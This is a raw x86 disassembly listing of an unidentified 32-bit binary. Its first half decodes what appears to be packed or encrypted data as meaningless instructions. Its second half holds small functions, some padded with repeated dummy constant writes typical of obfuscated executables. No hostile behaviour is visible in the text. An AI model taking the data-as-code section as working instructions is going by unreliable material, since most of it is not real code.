  41cdf1:	add    BYTE PTR [eax],al
  41cdf3:	add    BYTE PTR [eax+0x59],bl
  41cdf6:	(bad)
  41cdf9:	pop    ecx
  41cdfa:	(bad)
  41cdfd:	pop    ecx
  41cdfe:	(bad)
  41ce01:	pop    ds
  41ce02:	in     eax,0x8b
  41ce04:	rcr    DWORD PTR [edi+ebp*1+0xc079045],1
  41ce0b:	mov    edx,ecx
  41ce0d:	pushf  
  41ce0e:	fild   WORD PTR ds:0x457f9827
  41ce14:	cwde   
  41ce15:	jmp    0x59129ae1
  41ce1a:	(bad)
  41ce1d:	pop    eax
  41ce1e:	vmulps ymm3,ymm6,YMMWORD PTR [edi]
  41ce22:	in     eax,0x83
  41ce24:	clc    
  41ce25:	mov    eax,0x94e045cb
  41ce2a:	cwde   
  41ce2b:	add    DWORD PTR [edi+ebx*1-0x2dfaf7b2],ecx
  41ce32:	ror    BYTE PTR [ebx+0x55806c59],1
  41ce38:	xchg   esp,eax
  41ce39:	xchg   edi,eax
  41ce3a:	pop    ecx
  41ce3b:	cmp    al,0x5
  41ce3d:	loop   0x41ce27
  41ce3f:	mov    ecx,DWORD PTR [ecx+0x74]
  41ce42:	add    al,0xb7
  41ce44:	push   esp
  41ce45:	mov    al,ds:0x19ac557f
  41ce4a:	dec    ebp
  41ce4b:	or     dh,BYTE PTR [ebp+ebx*1+0x4e]
  41ce4f:	call   0x40495e78
  41ce54:	mov    WORD PTR [edi],ds
  41ce56:	push   es
  41ce57:	cmp    BYTE PTR [eax],al
	...
  41ce69:	add    BYTE PTR [eax],al
  41ce6b:	add    bl,bh
  41ce6d:	aad    0x8
  41ce6f:	push   ecx
  41ce70:	fs fwait
  41ce72:	hlt    
  41ce73:	push   DWORD PTR [ebx+0x17]
  41ce76:	int    0x8
  41ce78:	adc    eax,0xcc6af8d1
  41ce7d:	cld    
  41ce7e:	or     BYTE PTR [eax],dh
  41ce80:	mov    WORD PTR [eax+eiz*2+0x894fc00],ss
  41ce87:	push   0xffffff8c
  41ce89:	mov    ebx,DWORD PTR [esi-0x10]
  41ce8c:	adc    eax,0xe18becd1
  41ce91:	je     0x41ce13
  41ce93:	inc    edx
  41ce94:	fsub   st,st(4)
  41ce96:	jg     0x41cee5
  41ce98:	xchg   esp,eax
  41ce99:	in     eax,0x7f
  41ce9b:	push   ebp
  41ce9c:	sub    dh,ah
  41ce9e:	loopne 0x41ce21
  41cea0:	sbb    cl,BYTE PTR [ebx-0x67b77c0c]
  41cea6:	retf   
  41cea7:	inc    ebp
  41cea8:	add    BYTE PTR [eax+ecx*1+0x27f8c00],dl
  41ceaf:	mov    edx,DWORD PTR [ecx-0x80]
  41ceb2:	mov    al,al
  41ceb4:	lea    ebx,ds:0xd917f44e
  41ceba:	call   0xb26e9ce
  41cebf:	cmp    DWORD PTR [ecx-0x80],eax
  41cec2:	js     0x41cf1d
  41cec4:	pop    es
  41cec5:	shl    eax,1
  41cec7:	add    DWORD PTR [eax+eiz*4+0x8],0x74
  41cecc:	dec    ecx
  41cecd:	pop    ds
  41cece:	inc    esi
  41cecf:	call   0x41ced4
	...
  41cee4:	prefetch BYTE PTR [ecx]
  41cee7:	add    BYTE PTR [eax],bh
  41cee9:	enter  0x557f,0xb4
  41ceed:	push   ds
  41ceee:	inc    edi
  41ceef:	adc    BYTE PTR [edi],dl
  41cef1:	fld1   
  41cef3:	mov    edi,DWORD PTR ds:0x7c4485c8
  41cef9:	mov    eax,DWORD PTR [eax-0x293993b3]
  41ceff:	idiv   ebp
  41cf01:	enter  0x557f,0x6c
  41cf05:	call   0x457f:0xe4b042a3
  41cf0c:	je     0x41cf2c
  41cf0e:	inc    esi
  41cf0f:	or     BYTE PTR [edi+0x7511cdc],cl
  41cf15:	loopne 0x41cef7
  41cf17:	mov    ecx,ecx
  41cf19:	jo     0x41cf23
  41cf1b:	inc    edx
  41cf1c:	cwde   
  41cf1d:	in     al,0xe0
  41cf1f:	adc    eax,0x83f48a42
  41cf24:	push   eax
  41cf25:	cdq    
  41cf26:	jg     0x41cf75
  41cf28:	and    al,0x16
  41cf2a:	retf   0x1528
  41cf2d:	fsub   st,st(0)
  41cf2f:	jmp    0x41cf2f
  41cf31:	sbb    eax,0x7cbee45e
  41cf36:	ret    
  41cf37:	cld    
  41cf38:	adc    ecx,DWORD PTR [edx-0x36f3b78]
  41cf3e:	sbb    al,0x3
  41cf40:	dec    esp
  41cf41:	xchg   esp,eax
  41cf42:	test   eax,0x8d38338
  41cf47:	push   eax
	...
  41cf5c:	in     al,0xdd
  41cf5e:	out    dx,eax
  41cf5f:	(bad)  
  41cf60:	jmp    0x41cf77
  41cf62:	int    0x8
  41cf64:	adc    eax,0x9983d4d0
  41cf69:	sar    BYTE PTR [ebx+0x41],0x8c
  41cf6d:	xchg   esp,eax
  41cf6e:	jge    0x41cf7a
  41cf70:	pop    ss
  41cf71:	cwde   
  41cf72:	and    al,0x77
  41cf74:	dec    ebp
  41cf75:	xchg   esp,eax
  41cf76:	pop    ecx
  41cf77:	jmp    DWORD PTR [ecx+0x68]
  41cf7a:	mov    BYTE PTR ds:0x4a0178,bh
  41cf80:	mov    edi,?
  41cf82:	adc    al,0x6a
  41cf84:	dec    esp
  41cf85:	cld    
  41cf86:	or     BYTE PTR [eax],dh
  41cf88:	mov    WORD PTR [edi+edi*2+0x7fe69055],ss
  41cf8f:	inc    ebp
  41cf90:	ins    BYTE PTR es:[edi],dx
  41cf91:	sbb    eax,0x89dd3441
  41cf96:	pop    esi
  41cf97:	lock das 
  41cf99:	mov    al,ds:0x7d8c417b
  41cf9e:	push   ds
  41cf9f:	push   0xffffffcc
  41cfa1:	cld    
  41cfa2:	or     BYTE PTR [eax],dh
  41cfa4:	mov    WORD PTR [edi+edi*2+0x5ee65855],ss
  41cfab:	add    BYTE PTR [ebx-0x21],dl
  41cfae:	clc    
  41cfaf:	mov    ds:0x4a01a0,eax
  41cfb4:	xrstors [edi+esi*2]
  41cfb8:	int    0x94
  41cfba:	or     BYTE PTR [ebp-0x67],dh
  41cfbd:	dec    BYTE PTR [eax+0x68]
	...
  41cfd4:	mov    esp,es
  41cfd6:	or     BYTE PTR [eax],al
  41cfd8:	pop    ss
  41cfd9:	iret   
  41cfda:	hlt    
  41cfdb:	push   eax
  41cfdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfdd:	xchg   esp,eax
  41cfde:	repz push ebp
  41cfe0:	sbb    al,0x35
  41cfe2:	sbb    eax,0x7f944d77
  41cfe7:	dec    ebp
  41cfe8:	call   0x81a1607
  41cfed:	(bad)  
  41cfef:	mov    ecx,DWORD PTR [ecx+0x6c]
  41cff2:	or     BYTE PTR [edx-0x58],al
  41cff5:	sbb    ecx,DWORD PTR [esi-0x20]
  41cff8:	pop    ss
  41cff9:	xlat   BYTE PTR ds:[ebx]
  41cffa:	call   0x57260d8a
  41cfff:	mov    ecx,DWORD PTR [ecx+0x70]
  41d002:	pop    ecx
  41d003:	mov    ebx,DWORD PTR [ecx-0x73be8460]
  41d009:	jecxz  0x41cfeb
  41d00b:	push   ecx
  41d00c:	mov    ecx,0xc883f488
  41d011:	xchg   edi,eax
  41d012:	jg     0x41d069
  41d014:	lods   al,BYTE PTR ds:[esi]
  41d015:	adc    al,0xaf
  41d017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d018:	mov    WORD PTR [eax+ecx*1+0x7fcb2000],ss
  41d01f:	inc    ebp
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	sbb    al,0x46
  41d023:	fmul   DWORD PTR [edi-0x73ff56e4]
  41d029:	xchg   esp,eax
  41d02a:	or     DWORD PTR [ebp+0x68],0x2de05e1c
  41d031:	mov    eax,ds:0xbb8c417b
  41d036:	inc    esi
  41d037:	xor    al,0x0
	...
  41d049:	add    BYTE PTR [eax],al
  41d04b:	add    BYTE PTR [edi],ch
  41d04d:	aad    0x7b
  41d04f:	inc    ecx
  41d050:	mov    WORD PTR [ebx],ds
  41d052:	push   es
  41d053:	inc    eax
  41d054:	fcmovnbe st,st(5)
  41d056:	or     BYTE PTR [ecx+0x17],dl
  41d059:	mov    ds:0x94cd771c,al
  41d05e:	push   esi
  41d05f:	mov    edx,ecx
  41d061:	js     0x41d0bc
  41d063:	call   0x365bd8
  41d068:	sqrtps xmm0,XMMWORD PTR ds:0x8074d18b
  41d06f:	adc    eax,0x49ff80
  41d074:	(bad)  
  41d075:	in     eax,0x20
  41d077:	mov    DWORD PTR [ecx-0x73be841c],esp
  41d07d:	adc    esi,DWORD PTR [esi]
  41d07f:	xor    al,0x83
  41d081:	aad    0x8
  41d083:	add    BYTE PTR [ecx-0x48],bh
  41d086:	test   eax,0x8d56314
  41d08b:	push   eax
  41d08c:	pop    ss
  41d08d:	call   0x8b59:0x944d7758
  41d094:	jns    0x41d04e
  41d096:	jnp    0x41d0d9
  41d098:	mov    edx,fs
  41d09a:	loopne 0x41d0d1
  41d09c:	rol    DWORD PTR [edi-0x672f7c0c],0xa9
  41d0a3:	adc    al,0x3b
  41d0a5:	aad    0x8
  41d0a7:	push   eax
  41d0a8:	mov    ah,0x8f
  41d0aa:	out    dx,al
  41d0ab:	jmp    DWORD PTR [ebx+0x4cd13]
	...
  41d0c1:	add    BYTE PTR [eax],al
  41d0c3:	add    BYTE PTR [edi-0x70db9f0c],ah
  41d0c9:	aam    0x8
  41d0cb:	mov    ebx,DWORD PTR [ecx-0x73be8434]
  41d0d1:	in     eax,0xe0
  41d0d3:	adc    DWORD PTR [esi-0x79],esi
  41d0d6:	hlt    
  41d0d7:	or     DWORD PTR [eax-0x64],0xffffff81
  41d0db:	inc    ebp
  41d0dc:	inc    eax
  41d0dd:	sbb    ebx,DWORD PTR [esi]
  41d0df:	adc    al,0xdb
  41d0e1:	aad    0x8
  41d0e3:	push   edx
  41d0e4:	pop    es
  41d0e5:	shr    eax,1
  41d0e7:	mov    eax,DWORD PTR [ecx-0x73be8460]
  41d0ed:	xchg   ebx,eax
  41d0ee:	inc    eax
  41d0ef:	sub    ch,bl
  41d0f1:	sbb    ebx,DWORD PTR [esi]
  41d0f3:	sub    al,0xc3
  41d0f5:	aad    0x8
  41d0f7:	push   edx
  41d0f8:	and    al,0x7b
  41d0fa:	cmc    
  41d0fb:	jmp    FWORD PTR [ebx]
  41d0fd:	adc    ecx,ebp
  41d0ff:	or     al,0xed
  41d101:	mov    bh,0x7b
  41d103:	inc    ecx
  41d104:	mov    WORD PTR [ecx-0x6b728b38],ss
  41d10a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d10b:	pop    eax
  41d10c:	adc    ebp,0x8
  41d10f:	lea    edx,[ecx-0x74]
  41d112:	pop    edx
  41d113:	push   0x4c
  41d115:	cli    
  41d116:	or     cl,BYTE PTR [ebx+0x417bec99]
  41d11c:	mov    edx,fs
  41d11e:	repz push ebp
  41d120:	mov    eax,0xdbfca77b
  41d125:	xchg   BYTE PTR [ecx+0x1],dh
	...
  41d13b:	add    BYTE PTR [esp+edx*4-0x174e74f8],cl
  41d142:	mov    BYTE PTR [esp+ecx*4],0x58
  41d146:	(bad)
  41d149:	push   edi
  41d14a:	vmulps ymm3,ymm6,YMMWORD PTR [ebx]
  41d14e:	in     eax,0x8b
  41d150:	push   ecx
  41d151:	pushf  
  41d152:	jg     0x41d194
  41d154:	mov    al,ds:0xc8ccc7e8
  41d159:	push   edi
  41d15a:	(bad)
  41d15d:	sbb    esp,ebp
  41d15f:	push   ebx
  41d160:	loop   0x41d13f
  41d162:	jg     0x41d1a1
  41d164:	lods   al,BYTE PTR ds:[esi]
  41d165:	std    
  41d166:	dec    ecx
  41d167:	add    BYTE PTR [edi],al
  41d169:	test   al,0x20
  41d16b:	ja     0x41d13a
  41d16d:	xchg   esp,eax
  41d16e:	jg     0x41d1a5
  41d170:	test   ch,bh
  41d172:	dec    ecx
  41d173:	add    bl,al
  41d175:	out    0x4f,al
  41d177:	pop    ebp
  41d178:	dec    edi
  41d179:	pop    ecx
  41d17a:	(bad)
  41d17d:	sbb    ebp,esp
  41d17f:	push   ecx
  41d180:	mov    ah,0xc0
  41d182:	pop    es
  41d183:	inc    eax
  41d184:	mov    WORD PTR [ebx],?
  41d186:	xor    DWORD PTR [edi-0x33],esi
  41d189:	xchg   esp,eax
  41d18a:	pop    eax
  41d18b:	call   0x365d30
  41d190:	sqrtps xmm0,XMMWORD PTR [ecx]
  41d193:	mov    ecx,ecx
  41d195:	mov    BYTE PTR [eax+0x5ee3844d],al
  41d19b:	add    BYTE PTR [edi],al
  41d19d:	mov    al,ds:0x775c
	...
  41d1b2:	add    BYTE PTR [eax],al
  41d1b4:	dec    ebp
  41d1b5:	xchg   esp,eax
  41d1b6:	push   esi
  41d1b7:	call   FWORD PTR [ecx-0x78]
  41d1ba:	and    ch,0x59
  41d1bd:	push   ecx
  41d1be:	vmulps ymm3,ymm6,YMMWORD PTR [ecx]
  41d1c2:	in     eax,0x83
  41d1c4:	clc    
  41d1c5:	mov    al,0xcb
  41d1c7:	inc    ebp
  41d1c8:	in     al,0x94
  41d1ca:	or     BYTE PTR [eax],al
  41d1cc:	mov    WORD PTR [ebp+0x4e],cs
  41d1cf:	fcom   QWORD PTR [esp+edx*4+0x8]
  41d1d3:	add    bl,dl
  41d1d5:	iret   
  41d1d6:	cld    
  41d1d7:	add    DWORD PTR [esp+edx*4-0x77ae38f8],ecx
  41d1de:	or     DWORD PTR [eax],eax
  41d1e0:	mov    WORD PTR [ebx+ecx*8+0x894b045],ss
  41d1e7:	add    BYTE PTR [ecx+ebx*1-0x67faf7ba],cl
  41d1ee:	and    al,0x77
  41d1f0:	dec    ebp
  41d1f1:	xchg   esp,eax
  41d1f2:	loopne 0x41d25d
  41d1f4:	test   BYTE PTR [ebp-0x24f5e0c],al
  41d1fa:	dec    ecx
  41d1fb:	add    BYTE PTR [ecx-0x73ff0b7b],dh
  41d201:	add    BYTE PTR ds:0x7bc091c7,al
  41d207:	inc    ecx
  41d208:	mov    WORD PTR [eax+ecx*1-0x867400],ss
  41d20f:	(bad)  
  41d210:	mov    eax,eax
  41d212:	jnp    0x41d255
  41d214:	mov    WORD PTR [ebx+0x8],ss
	...
  41d22a:	add    BYTE PTR [eax],al
  41d22c:	mov    WORD PTR [ecx],ss
  41d22e:	ss sub al,0xc3
  41d231:	ror    DWORD PTR [eax],cl
  41d233:	add    BYTE PTR [ecx+0x6005cb9a],bh
  41d239:	std    
  41d23a:	dec    ecx
  41d23b:	add    BYTE PTR [esp+edx*4-0x38f0fff8],cl
  41d242:	cmp    al,0x77
  41d244:	int    0x94
  41d246:	or     BYTE PTR [ebp-0x67],dh
  41d249:	cli    
  41d24a:	or     bh,bh
  41d24c:	cdq    
  41d24d:	xchg   esp,eax
  41d24e:	jnp    0x41d291
  41d250:	mov    WORD PTR [ecx],?
  41d252:	and    eax,0x7f944d77
  41d257:	or     eax,0x49fdb8
  41d25c:	adc    eax,0x818be0d7
  41d261:	mov    eax,0x198c417b
  41d266:	dec    esi
  41d267:	call   0x8976a4fb
  41d26c:	dec    ecx
  41d26d:	jl     0x41d1ef
  41d26f:	dec    ebp
  41d270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d271:	sbb    al,BYTE PTR [esi]
  41d273:	sbb    al,0x3b
  41d275:	ror    DWORD PTR [eax],cl
  41d277:	push   0x48914c
  41d27c:	mov    ds:0x4d77089e,eax
  41d281:	xchg   esp,eax
  41d282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d283:	cmp    BYTE PTR [ebx],bl
  41d285:	ror    DWORD PTR [eax],cl
  41d287:	(bad)  
  41d288:	xchg   ecx,eax
  41d289:	int3   
  41d28a:	jnp    0x41d2cd
  41d28c:	mov    ecx,?
  41d28e:	pop    es
  41d28f:	inc    eax
	...
  41d2a4:	mov    esp,gs
  41d2a6:	pop    eax
  41d2a7:	add    ecx,esp
  41d2a9:	xchg   esp,eax
  41d2aa:	jg     0x41d2c1
  41d2ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2ad:	or     ecx,DWORD PTR [edx+0x0]
  41d2b0:	mov    esi,0x5bf8876c
  41d2b5:	test   BYTE PTR [eax+0x4d3784c4],cl
  41d2bb:	ja     0x41d28a
  41d2bd:	xchg   esp,eax
  41d2be:	repz adc eax,0x4a0bc8
  41d2c4:	out    dx,eax
  41d2c5:	call   0x35ce1445
  41d2ca:	inc    ecx
  41d2cb:	ja     0x41d29a
  41d2cd:	xchg   esp,eax
  41d2ce:	pop    eax
  41d2cf:	call   0x3655ac
  41d2d4:	mulps  xmm1,XMMWORD PTR ds:0x8084c989
  41d2db:	dec    ebp
  41d2dc:	cld    
  41d2dd:	in     eax,0xe0
  41d2df:	aad    0x2
  41d2e1:	test   ah,dh
  41d2e3:	adc    eax,0xffffff98
  41d2e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2e7:	xor    BYTE PTR [ebx-0x2b],bh
  41d2ea:	or     BYTE PTR [ebx+0x6a578441],cl
  41d2f0:	mov    WORD PTR ds:0x944d7739,?
  41d2f6:	pop    eax
  41d2f7:	call   0x364f2c
  41d2fc:	mulps  xmm0,XMMWORD PTR ds:0x8284518b
  41d303:	dec    ebp
  41d304:	lods   al,BYTE PTR ds:[esi]
  41d305:	divps  xmm7,xmm4
	...
  41d31c:	ja     0x41d307
  41d31e:	clc    
  41d31f:	jae    0x41d367
  41d321:	cmovle esp,eax
  41d324:	cmp    al,0xf
  41d326:	inc    esi
  41d327:	fdivr  QWORD PTR ds:0x93fba36c
  41d32d:	or     DWORD PTR [eax+0x353794c4],0x77
  41d334:	int    0x94
  41d336:	jg     0x41d34d
  41d338:	mov    eax,0xde004a0b
  41d33d:	xor    eax,0x94cd7741
  41d342:	pop    es
  41d343:	inc    ebp
  41d344:	push   0x9c0d7fe4
  41d349:	or     ecx,DWORD PTR [edx+0x0]
  41d34c:	(bad)  
  41d34d:	shl    esp,1
  41d34f:	push   ecx
  41d350:	xor    al,0x2b
  41d352:	out    dx,eax
  41d353:	inc    DWORD PTR [ebx+0x17]
  41d356:	int    0xc
  41d358:	pop    es
  41d359:	jmp    0x611ad75a
  41d35e:	or     BYTE PTR [ebp+0x30],dl
  41d361:	or     eax,0xd917e45e
  41d366:	hlt    
  41d367:	add    edx,ecx
  41d369:	pusha  
  41d36a:	add    BYTE PTR [ebp+0x10],0xf
  41d36e:	inc    esi
  41d36f:	loopne 0x41d328
  41d371:	xchg   ecx,eax
  41d372:	xor    al,0x77
  41d374:	dec    ebp
  41d375:	xchg   esp,eax
  41d376:	or     DWORD PTR [ebp-0x14],0x49c7936e
  41d37d:	jl     0x41d388
	...
  41d393:	add    BYTE PTR [esp+edx*4-0x16e8f621],cl
  41d39a:	lock or esi,0xffffff97
  41d39e:	adc    DWORD PTR [ebp-0x2c],0x87f84e0e
  41d3a5:	fprem  
  41d3a7:	jae    0x41d32d
  41d3a9:	clts   
  41d3ab:	xor    BYTE PTR [ebx-0x2b],al
  41d3ae:	or     BYTE PTR [ebx],al
  41d3b0:	inc    ecx
  41d3b1:	jl     0x41d333
  41d3b3:	adc    DWORD PTR [edi+0x5ca1f0e9],ecx
  41d3b9:	or     ecx,DWORD PTR [edx+0x0]
  41d3bc:	(bad)  
  41d3bd:	f2xm1  
  41d3bf:	mov    DWORD PTR [edi+ecx*1+0x46],edi
  41d3c3:	clc    
  41d3c4:	or     eax,0x8c03e254
  41d3c9:	xchg   esp,eax
  41d3ca:	jg     0x41d3e1
  41d3cc:	mov    esp,0x8f004a09
  41d3d1:	out    0xf0,eax
  41d3d3:	xor    edx,DWORD PTR [esi-0x3288c6cd]
  41d3d9:	xchg   esp,eax
  41d3da:	pop    es
  41d3db:	inc    ebp
  41d3dc:	push   esp
  41d3dd:	or     al,0x1
  41d3df:	jmp    0x41d3fc
  41d3e1:	or     al,0x26
  41d3e3:	and    al,0xc3
  41d3e5:	ror    DWORD PTR [eax],cl
  41d3e7:	mov    DWORD PTR [ecx-0x73be844c],eax
  41d3ed:	(bad)
  41d3f0:	jns    0x41d38e
  41d3f2:	jnp    0x41d435
  41d3f4:	mov    ebp,es
  41d3f6:	ror    DWORD PTR [ecx+0x0],0x0
	...
  41d409:	add    BYTE PTR [eax],al
  41d40b:	add    BYTE PTR [ecx-0x73be8454],al
  41d411:	ins    BYTE PTR es:[edi],dx
  41d412:	add    edi,eax
  41d414:	adc    eax,DWORD PTR [edx+0x9bc0d80]
  41d41a:	dec    edx
  41d41b:	add    BYTE PTR [ebp+0x6c],bl
  41d41e:	pop    es
  41d41f:	sti    
  41d420:	sti    
  41d421:	or     DWORD PTR [esi+0x379879c0],0x7faef7c0
  41d42b:	and    eax,0x4a09a8
  41d430:	mulps  xmm1,XMMWORD PTR ds:0x7bc89183
  41d437:	inc    ecx
  41d438:	mov    WORD PTR [esp+edi*2+0x7ba8ed09],ss
  41d43f:	inc    ecx
  41d440:	mov    WORD PTR [ebx],cs
  41d442:	dec    ebp
  41d443:	and    al,0x88
  41d445:	ins    BYTE PTR es:[edi],dx
  41d446:	jg     0x41d445
  41d448:	stos   DWORD PTR es:[edi],eax
  41d449:	add    DWORD PTR [eax+0x4a093c15],0x38553e00
  41d453:	rol    BYTE PTR [edi],0x78
  41d456:	push   esi
  41d457:	ret    
  41d458:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d45f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d466:	or     BYTE PTR [eax],al
  41d468:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
	...
  41d483:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d48a:	or     BYTE PTR [eax],al
  41d48c:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d493:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d49a:	or     BYTE PTR [eax],al
  41d49c:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4a3:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d4aa:	or     BYTE PTR [eax],al
  41d4ac:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4b3:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d4ba:	or     BYTE PTR [eax],al
  41d4bc:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4c3:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d4ca:	or     BYTE PTR [eax],al
  41d4cc:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4d3:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d4da:	or     BYTE PTR [eax],al
  41d4dc:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4e3:	add    BYTE PTR [esp+edx*4+0x8],cl
	...
  41d4fa:	add    BYTE PTR [eax],al
  41d4fc:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d503:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d50a:	or     BYTE PTR [eax],al
  41d50c:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d513:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d51a:	or     BYTE PTR [eax],al
  41d51c:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d523:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d52a:	or     BYTE PTR [eax],al
  41d52c:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d533:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d53a:	or     BYTE PTR [eax],al
  41d53c:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d543:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d54a:	or     BYTE PTR [eax],al
  41d54c:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d553:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d55a:	or     BYTE PTR [eax],al
  41d55c:	mov    WORD PTR [eax+ecx*1+0x0],ss
	...
  41d573:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d57a:	or     BYTE PTR [eax],al
  41d57c:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d583:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d58a:	or     BYTE PTR [eax],al
  41d58c:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d593:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d59a:	or     BYTE PTR [eax],al
  41d59c:	mov    WORD PTR [eax+ecx*1-0x1374ab00],ss
  41d5a3:	pop    ebp
  41d5a4:	ret    0x10
  41d5a7:	int3   
  41d5a8:	int3   
  41d5a9:	int3   
  41d5aa:	int3   
  41d5ab:	int3   
  41d5ac:	int3   
  41d5ad:	int3   
  41d5ae:	int3   
  41d5af:	int3   
  41d5b0:	push   ebp
  41d5b1:	mov    ebp,esp
  41d5b3:	pop    ebp
  41d5b4:	ret    0x10
  41d5b7:	int3   
  41d5b8:	int3   
  41d5b9:	int3   
  41d5ba:	int3   
  41d5bb:	int3   
  41d5bc:	int3   
  41d5bd:	int3   
  41d5be:	int3   
  41d5bf:	int3   
  41d5c0:	push   ebp
  41d5c1:	mov    ebp,esp
  41d5c3:	call   0x41dc20
  41d5c8:	mov    eax,ds:0x42312c
  41d5cd:	push   eax
  41d5ce:	call   0x41e860
  41d5d3:	add    esp,0x4
  41d5d6:	mov    ds:0x423130,eax
  41d5db:	pop    ebp
  41d5dc:	ret    
  41d5dd:	int3   
  41d5de:	int3   
  41d5df:	int3   
  41d5e0:	push   ebp
  41d5e1:	mov    ebp,esp
  41d5e3:	push   ecx
  41d5e4:	mov    DWORD PTR [ebp-0x4],0x4
  41d5eb:	mov    eax,DWORD PTR [ebp-0x4]
  41d5ee:	add    eax,0x401270
  41d5f3:	mov    ds:0x423134,eax
  41d5f8:	mov    esp,ebp
  41d5fa:	pop    ebp
  41d5fb:	ret    
  41d5fc:	int3   
  41d5fd:	int3   
  41d5fe:	int3   
  41d5ff:	int3   
  41d600:	push   ebp
  41d601:	mov    ebp,esp
  41d603:	mov    eax,DWORD PTR [ebp+0x8]
  41d606:	mov    ecx,DWORD PTR [ebp+0x8]
  41d609:	add    ecx,DWORD PTR [eax+0x4]
  41d60c:	mov    eax,ecx
  41d60e:	pop    ebp
  41d60f:	ret    
  41d610:	push   ebp
  41d611:	mov    ebp,esp
  41d613:	mov    eax,DWORD PTR [ebp+0x8]
  41d616:	mov    eax,DWORD PTR [eax-0x4]
  41d619:	pop    ebp
  41d61a:	ret    
  41d61b:	int3   
  41d61c:	int3   
  41d61d:	int3   
  41d61e:	int3   
  41d61f:	int3   
  41d620:	push   ebp
  41d621:	mov    ebp,esp
  41d623:	sub    esp,0x18
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp-0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp+0xc]
  41d62f:	mov    DWORD PTR [ebp-0x4],ecx
  41d632:	mov    DWORD PTR [ebp-0x10],0x19c
  41d639:	mov    edx,DWORD PTR [ebp-0x8]
  41d63c:	mov    DWORD PTR ds:0x423138,edx
  41d642:	mov    eax,DWORD PTR [ebp-0x4]
  41d645:	mov    ds:0x42313c,eax
  41d64a:	mov    ecx,DWORD PTR ds:0x423138
  41d650:	mov    DWORD PTR [ebp-0x14],ecx
  41d653:	mov    edx,DWORD PTR ds:0x42313c
  41d659:	mov    DWORD PTR [ebp-0xc],edx
  41d65c:	mov    eax,DWORD PTR [ebp-0xc]
  41d65f:	mov    ecx,DWORD PTR [ebp-0x14]
  41d662:	lea    edx,[ecx+eax*2]
  41d665:	mov    DWORD PTR [ebp-0x18],edx
  41d668:	mov    eax,DWORD PTR [ebp-0x18]
  41d66b:	mov    DWORD PTR [ebp-0x14],eax
  41d66e:	mov    ecx,DWORD PTR [ebp-0x14]
  41d671:	movzx  edx,WORD PTR [ecx]
  41d674:	mov    DWORD PTR [ebp-0xc],edx
  41d677:	mov    eax,DWORD PTR [ebp-0xc]
  41d67a:	mov    esp,ebp
  41d67c:	pop    ebp
  41d67d:	ret    
  41d67e:	int3   
  41d67f:	int3   
  41d680:	push   ebp
  41d681:	mov    ebp,esp
  41d683:	sub    esp,0xc
  41d686:	mov    eax,DWORD PTR [ebp+0x8]
  41d689:	mov    DWORD PTR [ebp-0x8],eax
  41d68c:	mov    ecx,DWORD PTR [ebp+0xc]
  41d68f:	mov    DWORD PTR [ebp-0xc],ecx
  41d692:	mov    DWORD PTR [ebp-0x4],0x11afc
  41d699:	mov    edx,DWORD PTR [ebp-0x8]
  41d69c:	cmp    edx,DWORD PTR [ebp-0xc]
  41d69f:	jae    0x41d6af
  41d6a1:	mov    DWORD PTR [ebp-0x4],0x11afc
  41d6a8:	mov    eax,DWORD PTR [ebp-0x8]
  41d6ab:	jmp    0x41d6b9
  41d6ad:	jmp    0x41d6b9
  41d6af:	mov    DWORD PTR [ebp-0x4],0x11afc
  41d6b6:	mov    eax,DWORD PTR [ebp-0xc]
  41d6b9:	mov    esp,ebp
  41d6bb:	pop    ebp
  41d6bc:	ret    
  41d6bd:	int3   
  41d6be:	int3   
  41d6bf:	int3   
  41d6c0:	push   ebp
  41d6c1:	mov    ebp,esp
  41d6c3:	push   ecx
  41d6c4:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6cb:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6d2:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6d9:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6e0:	mov    DWORD PTR [ebp-0x4],0x3085
